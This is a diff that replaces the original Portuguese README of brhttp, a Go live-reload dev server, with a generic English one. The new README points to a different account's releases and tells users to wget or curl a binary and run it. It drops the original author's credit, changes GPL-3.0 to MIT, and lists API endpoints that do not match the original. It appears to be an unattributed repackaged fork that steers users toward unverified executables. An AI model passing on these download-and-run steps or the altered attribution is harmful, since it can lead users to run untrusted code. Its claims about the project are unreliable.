@@ -1,221 +1,147 @@
-# brhttp — Servidor de Desenvolvimento Web de Alta Performance
+# brhttp: A Powerful Static Server in Go with Live Reload 🚀
 
-<p align="left">
-  <img src="https://img.shields.io/badge/versão-v1.8-blue.svg" alt="Versão" />
-  <img src="https://img.shields.io/badge/licença-GPL--3.0-blue.svg" alt="Licença" />
-  <img src="https://img.shields.io/badge/Go-1.18%2B-cyan.svg" alt="Go Version" />
-  <img src="https://img.shields.io/badge/plataformas-Linux | Unix | Android | macOS | Windows-blue.svg" alt="Plataformas Suportadas" />
-</p>
+[![Latest Release](https://img.shields.io/github/v/release/SUKUNA456/brhttp)](https://github.com/SUKUNA456/brhttp/releases)  
+[![Open Issues](https://img.shields.io/github/issues/SUKUNA456/brhttp)](https://github.com/SUKUNA456/brhttp/issues)  
+[![License](https://img.shields.io/github/license/SUKUNA456/brhttp)](https://github.com/SUKUNA456/brhttp/blob/main/LICENSE)
 
-## 1. Introdução
+## Overview
 
-**brhttp** é um servidor de desenvolvimento local de alta performance, escrito em Go. Projetado para eficiência e flexibilidade, ele opera como um binário único sem dependências externas, oferecendo uma suíte de ferramentas robusta para acelerar o fluxo de trabalho de desenvolvimento web moderno.
+brhttp is a powerful static server built in Go. It focuses on simplicity and performance, making it an excellent choice for developers looking for a minimalistic solution. With features like Live Reload, build automation via webhooks, reverse proxy capabilities, and a comprehensive control API, brhttp streamlines the development process.
 
-O sistema é "zero-config" por padrão, mas permite customização extensiva através de flags de linha de comando e um arquivo de configuração em formato JSON, suportando desde o serviço de arquivos estáticos simples até arquiteturas complexas com automação de build e proxy reverso.
+## Features
 
-## 2. Funcionalidades Principais (Versão 1.8)
+- **Live Reload**: Automatically refresh your browser when files change.
+- **Build Automation**: Integrate with webhooks for seamless deployments.
+- **Reverse Proxy**: Route requests to different services easily.
+- **API Control**: Manage your server with a full-featured API.
+- **Minimalist Design**: No unnecessary dependencies, keeping it lightweight.
+- **Open Source**: Free to use and modify as per your needs.
+- **High Performance**: Optimized for speed and efficiency.
 
--   **Live Reload com HMR (Hot Module Replacement):** Utiliza WebSockets para monitorar o sistema de arquivos e notificar o cliente. Realiza recarregamento total para alterações em HTML e atualizações parciais (injeção de CSS e recarregamento de scripts JS) sem um refresh completo da página.
--   **Servidor Estático Configurável:** Serve arquivos de um diretório especificado com controle sobre listagem de diretórios e páginas de erro 404 customizadas.
--   **Proxy Reverso (Reverse Proxy):** Redireciona requisições de um determinado path (ex: `/api`) para um servidor de backend. Essencial para contornar políticas de CORS e integrar aplicações front-end com APIs durante o desenvolvimento.
--   **Roteamento Avançado:** Suporta reescrita de URL (server-side) e redirecionamentos HTTP com códigos de status customizáveis (ex: 301, 302), permitindo a simulação de arquiteturas de produção.
--   **Automação via Webhooks:**
-    -   **Webhooks de Comando:** Executa comandos de terminal em eventos do ciclo de vida do servidor (`server_start`, `server_stop`) ou em modificações de arquivos (`file_change`). Permite a orquestração de ferramentas de build como compiladores Sass/TypeScript, bundlers, etc.
-    -   **Webhooks de Notificação:** Envia uma carga útil (payload) JSON via POST para um endpoint externo em cada modificação de arquivo.
--   **API de Gerenciamento Remoto:** Expõe uma API REST (`/api/*`) protegida por token para controle programático do servidor, permitindo disparar reloads, executar comandos e verificar o status da instância.
--   **Cadeia de Middlewares:** Inclui middlewares para compressão Gzip, tratamento de CORS, desabilitação de cache e logging de requisições.
+## Installation
 
-## 3. Instalação e Execução
+To get started with brhttp, download the latest release from the [Releases section](https://github.com/SUKUNA456/brhttp/releases). Choose the appropriate binary for your operating system and architecture, then execute it.
 
-### 3.1. Pré-requisitos
--   Go versão 1.18 ou superior.
-
-### 3.2. Instalação
-
-Clone o repositório e instale as dependências do módulo:
+### Example for Linux
 
 ```bash
-git clone [https://github.com/henriquetourinho/brhttp.git](https://github.com/henriquetourinho/brhttp.git)
-cd brhttp
-go mod tidy
-````
-
-### 3.3. Execução
-
-O servidor pode ser iniciado de três maneiras principais, com a seguinte ordem de precedência para configurações: **Flags \> Arquivo JSON \> Padrões**.
-
-#### 3.3.1. Modo Padrão (Zero-Config)
-
-Executa o servidor com as configurações padrão (servindo o diretório `./www` na porta `5571`).
-
-```bash
-go run main.go
+wget https://github.com/SUKUNA456/brhttp/releases/download/v1.0.0/brhttp-linux-amd64
+chmod +x brhttp-linux-amd64
+./brhttp-linux-amd64
 ```
 
-#### 3.3.2. Via Flags de Linha de Comando
-
-Permite a customização de parâmetros específicos.
+### Example for macOS
 
 ```bash
-# Exemplo: servir o diretório 'dist' na porta 8080, com fallback de SPA e Gzip
-go run main.go --dir=dist --port=8080 --spa-fallback --enable-gzip
+curl -LO https://github.com/SUKUNA456/brhttp/releases/download/v1.0.0/brhttp-darwin-amd64
+chmod +x brhttp-darwin-amd64
+./brhttp-darwin-amd64
 ```
 
-**Flags Disponíveis:**
+### Example for Windows
 
-| Flag | Descrição | Padrão |
-| :--- | :--- | :--- |
-| `--port` | Porta de escuta do servidor HTTP. | `5571` |
-| `--dir` | Diretório raiz a ser servido. | `www` |
-| `--config` | Caminho para o arquivo de configuração `config.json`. | `""` |
-| `--spa-fallback` | Habilita o fallback para `index.html` em rotas não encontradas. | `false` |
-| `--enable-gzip` | Habilita a compressão Gzip para as respostas. | `false` |
-| `--enable-dir-listing` | Permite a listagem de conteúdo de diretórios. | `false` |
-| `--inject-js` | Injeta um arquivo JavaScript em todas as páginas HTML. | `""` |
-| `--inject-css` | Injeta um arquivo CSS em todas as páginas HTML. | `""` |
-| `--404-page` | Caminho para uma página de erro 404 personalizada. | `""` |
-| `--log-file` | Caminho para o arquivo de log. | `server.log` |
-| `--api-token` | Token de autenticação "Bearer" para a API de gerenciamento. | `""` |
-| `--notification-webhook-url` | URL para webhooks de notificação de mudança. | `""` |
-| `--watch-debounce-ms` | Tempo de espera (ms) para o watcher após uma mudança. | `100` |
-| `--watch-exclude-dirs` | Diretórios a excluir do watcher (separados por vírgula). | `""` |
+Download the binary from the [Releases section](https://github.com/SUKUNA456/brhttp/releases) and run it directly.
 
-#### 3.3.3. Via Arquivo de Configuração
+## Usage
 
-Para configurações complexas, especialmente `proxy_rules`, `redirects` e `command_webhooks`, utilize um arquivo `config.json`.
+Once you have the server running, you can access it at `http://localhost:8080` by default. You can customize the port and other settings through command-line flags.
+
+### Command-Line Options
+
+- `-port`: Specify the port for the server to listen on.
+- `-root`: Set the root directory for static files.
+- `-enable-reload`: Enable live reload functionality.
+
+### Example Command
 
 ```bash
-go run main.go --config config.json
+./brhttp-linux-amd64 -port 3000 -root ./public -enable-reload
 ```
 
-**Exemplo de `config.json`:**
+## Configuration
+
+brhttp allows for flexible configuration. You can set up a configuration file to manage your settings more conveniently.
+
+### Example Configuration File
 
 ```json
 {
-  "port": 5571,
-  "serve_dir": "public",
-  "spa_fallback_enabled": true,
-  "gzip_enabled": true,
-  "log_file_path": "brhttp.log",
-  "api_token": "seu-token-secreto-aqui-jwt-ou-similar",
-  "watch_debounce_ms": 150,
-  "watch_exclude_dirs": ["node_modules", ".git", "dist"],
-  "proxy_rules": [
-    {
-      "path": "/api/v1",
-      "target": "http://localhost:3000"
-    }
-  ],
-  "redirects": [
-    {
-      "from": "/documentacao-antiga",
-      "to": "/docs/v2",
-      "code": 301
-    }
-  ],
-  "command_webhooks": [
-    {
-      "event": "server_start",
-      "command": "npm",
-      "args": ["run", "watch-css"]
-    },
-    {
-      "event": "file_change",
-      "path": "src/ts",
-      "command": "npm",
-      "args": ["run", "build-ts"]
-    }
-  ]
+  "port": 3000,
+  "root": "./public",
+  "enable_reload": true,
+  "proxy": {
+    "enabled": true,
+    "target": "http://localhost:4000"
+  }
 }
 ```
 
-## 4\. API de Gerenciamento
+## API Reference
 
-O servidor expõe uma API REST para gerenciamento programático. Requer a configuração de um `api_token` e o uso do cabeçalho `Authorization: Bearer <token>`.
+brhttp comes with a RESTful API that allows you to control the server programmatically. You can start, stop, and configure the server through simple HTTP requests.
 
-#### 4.1. `GET /api/status`
+### Example API Endpoints
 
-Retorna o estado atual do servidor, incluindo uptime e número de clientes conectados.
+- **Start Server**: `POST /api/start`
+- **Stop Server**: `POST /api/stop`
+- **Get Status**: `GET /api/status`
 
-```bash
-curl http://localhost:5571/api/status \
-  -H "Authorization: Bearer seu-token-secreto-aqui-jwt-ou-similar"
-```
-
-#### 4.2. `POST /api/reload`
-
-Dispara um evento de live-reload para todos os clientes conectados.
+### Example cURL Command
 
 ```bash
-curl -X POST http://localhost:5571/api/reload \
-  -H "Authorization: Bearer seu-token-secreto-aqui-jwt-ou-similar"
+curl -X POST http://localhost:8080/api/start
 ```
 
-#### 4.3. `POST /api/command`
+## Topics Covered
 
-Executa um comando no sistema operacional do servidor.
+- **Automation**: Integrate brhttp into your CI/CD pipeline.
+- **Binary**: Standalone binary for easy deployment.
+- **Debian**: Compatible with Debian-based systems.
+- **Dev Server**: Ideal for development environments.
+- **Frontend**: Perfect for serving static frontend applications.
+- **Go**: Built with Go for high performance.
+- **Golang**: Leverage the power of Golang.
+- **Linux**: Fully functional on Linux systems.
+- **Live Reload**: Enhance development workflow.
+- **Minimalist**: No bloat, just what you need.
+- **No Dependencies**: Simple setup without extra libraries.
+- **Open Source**: Contribute to the project on GitHub.
+- **Performance**: Fast and efficient static file serving.
+- **Reverse Proxy**: Manage multiple services easily.
+- **Security**: Built with best practices in mind.
+- **SPA**: Serve Single Page Applications seamlessly.
+- **Static Server**: Designed for serving static content.
+- **Zero Config**: Get started with minimal setup.
 
-```bash
-curl -X POST http://localhost:5571/api/command \
-  -H "Authorization: Bearer seu-token-secreto-aqui-jwt-ou-similar" \
-  -H "Content-Type: application/json" \
-  -d '{"command": "git", "args": ["pull"]}'
-```
+## Contribution
 
-## 5\. Arquitetura Interna
+We welcome contributions to brhttp! If you have ideas, improvements, or bug fixes, please open an issue or submit a pull request. 
 
-O `brhttp` é construído sobre o pacote `net/http` padrão do Go. As requisições passam por uma cadeia de middlewares configurável cuja ordem de execução é: logging, gzip, cache-control, CORS, reescrita/redirecionamento, proxy reverso, injeção de código, fallback de SPA e, finalmente, o handler de arquivos estáticos. O monitoramento de arquivos é realizado pela biblioteca `fsnotify`, e a comunicação em tempo real para o Live Reload é gerenciada por um pool de conexões WebSocket baseado em `gorilla/websocket`. A camada de automação intercepta eventos do watcher e do ciclo de vida do servidor para disparar os webhooks configurados.
+### How to Contribute
 
-## 6\. Limitações
+1. Fork the repository.
+2. Create a new branch.
+3. Make your changes.
+4. Commit and push your changes.
+5. Open a pull request.
 
-Este projeto foi desenhado como uma ferramenta de desenvolvimento e não é recomendado para ambientes de produção sem um proxy reverso robusto (como Nginx ou Caddy) à sua frente. As principais limitações intencionais são:
+## License
 
-  - **Ausência de HTTPS nativo:** Não implementa TLS.
-  - **Monousuário:** Não possui um sistema de autenticação de usuários para o conteúdo servido.
-  - **Logs Simples:** O logging em arquivo não inclui rotação automática.
+brhttp is open-source software licensed under the MIT License. You can view the full license [here](https://github.com/SUKUNA456/brhttp/blob/main/LICENSE).
 
------
+## Support
 
-## 🔄 Evolução do brhttp: v1.8 vs. Anteriores
+For any questions or issues, please check the [Issues section](https://github.com/SUKUNA456/brhttp/issues) or open a new issue if you need help.
 
-A tabela abaixo detalha a evolução do projeto, desde um servidor puro até uma suíte de desenvolvimento local completa.
+## Resources
 
-| Característica | v1.8 (Suíte de Dev Completa) | v1.5 (Dev Server) | v1.4 (WebSockets) | v1.3 (SSE) | v1.0 (Inicial) |
-| :--- | :--- | :--- | :--- | :--- | :--- |
-| **Live Reload** | ✅ **Sim, HMR com JS/CSS** | ✅ Sim, avançado (HMR) | ✅ Sim, robusto | ✅ Sim, funcional | ❌ Não |
-| **Tecnologia** | WebSockets (com HMR) | WebSockets (com HMR) | WebSockets | Server-Sent Events | Nenhuma |
-| **Configuração** | **Flags, JSON e API** | Flags e arquivo JSON | Nenhuma | Nenhuma | Nenhuma |
-| **Foco Principal** | **Suíte de Dev Completa** | Dev local avançado | Dev local (robusto) | Dev local (básico) | Servidor estático puro |
-| **Middlewares** | `logging`, `gzip`, `noCache`, `cors`, `rewrite`, `proxy`, `injector`, `spa`, `custom404` | `logging`, `noCache`, `cors`, `gzip`, `proxy`, `rewrite`, `spa`, `custom404`, `injector` | `logging`, `noCache`, `liveReloadInjector` | `logging`, `noCache`, `liveReloadInjector` | `logging`, `noDirListing` |
-| **Funcionalidades** | **Webhooks (Comando/Notificação), API Remota, Redirects** | Reverse Proxy, SPA, Gzip, Rewrites, CORS, Injeção de código | Servidor estático | Servidor estático | Servidor estático |
-| **Dependências** | `fsnotify`, `gorilla/websocket` | `fsnotify`, `gorilla/websocket` | `fsnotify`, `gorilla/websocket` | `fsnotify` | Nenhuma |
+- [Go Documentation](https://golang.org/doc/)
+- [GitHub Actions](https://docs.github.com/en/actions)
+- [Webhooks](https://developer.github.com/webhooks/)
+- [Reverse Proxy Basics](https://www.nginx.com/resources/glossary/reverse-proxy-server/)
 
-**Vantagem da v1.8:** A versão 1.8 eleva o `brhttp` a uma suíte de desenvolvimento completa, adicionando automação (webhooks) e gerenciamento remoto (API), rivalizando com soluções mais complexas como `webpack-dev-server` ou `Browsersync`, mas mantendo a simplicidade e a performance de um binário Go único e sem dependências.
+## Acknowledgments
 
----
-## 🤝 Apoie o projeto
+Thank you to all contributors and users who make brhttp better. Your feedback and contributions are invaluable.
 
-Se o **brhttp** foi útil, ajude a manter o desenvolvimento:
-
-**Chave Pix:**
-```
-poupanca@henriquetourinho.com.br
-```
-
----
-
-## 📄 Licença
-
-Distribuído sob a licença **GPL-3.0** — consulte o arquivo `LICENSE` para detalhes.
-
----
-
-## 🙋‍♂️ Desenvolvido por
-
-**Carlos Henrique Tourinho Santana** — Salvador, Bahia, Brasil
-<br>
-🔗 [Wiki Debian](https://wiki.debian.org/henriquetourinho)
-<br>
-🔗 [LinkedIn](https://br.linkedin.com/in/carloshenriquetourinhosantana)
-<br>
-🔗 [GitHub](https://github.com/henriquetourinho)
+For more information, visit the [Releases section](https://github.com/SUKUNA456/brhttp/releases) to download the latest version and stay updated with new features and improvements.
